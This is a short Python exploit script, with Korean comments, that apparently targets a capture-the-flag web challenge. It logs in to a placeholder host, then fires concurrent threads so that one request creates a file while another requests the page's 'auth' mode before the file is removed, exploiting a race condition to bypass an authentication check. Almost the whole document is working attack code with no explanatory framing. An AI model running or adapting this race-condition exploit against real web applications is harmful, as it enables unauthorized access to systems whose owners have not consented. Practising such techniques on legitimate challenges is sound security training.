import requests
import threading
import time

LOGIN_URL = "http://target.com/login.php"
URL = "http://target.com/challenge_page.php"
COOKIES = {}
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}

LOGIN_DATA = {
    "username": "YOUR_USERNAME",  # 여기에 사용자 이름을 입력하세요
    "password": "YOUR_PASSWORD"   # 여기에 비밀번호를 입력하세요
}

def login():
    """
    로그인 요청을 보내고 세션 쿠키를 저장합니다.
    """
    session = requests.Session()
    response = session.post(LOGIN_URL, data=LOGIN_DATA, headers=HEADERS)
    if response.status_code == 200:
        print("[+] Logged in successfully!")
        global COOKIES
        COOKIES = session.cookies.get_dict()
    else:
        print("[-] Login failed!")
        exit()

def create_file():
    """
    파일을 생성하는 요청을 보냅니다.
    """
    requests.get(URL, cookies=COOKIES, headers=HEADERS)

def auth_attempt():
    """
    파일이 존재하는 동안 파일을 읽으려고 시도합니다.
    """
    params = {
        "mode": "auth"
    }
    response = requests.get(URL, params=params, cookies=COOKIES, headers=HEADERS)
    if "Done!" in response.text:
        print("[+] Success!")
        print(response.text)

if __name__ == "__main__":
    login()
    # 다중 스레드를 사용하여 레이스 컨디션을 유발합니다.
    for i in range(10):
        t1 = threading.Thread(target=create_file)
        t2 = threading.Thread(target=auth_attempt)
        t1.start()
        t2.start()
        time.sleep(0.1)  # 너무 빠르게 요청하지 않도록 약간의 딜레이를 줍니다.

        t1.join()
        t2.join()
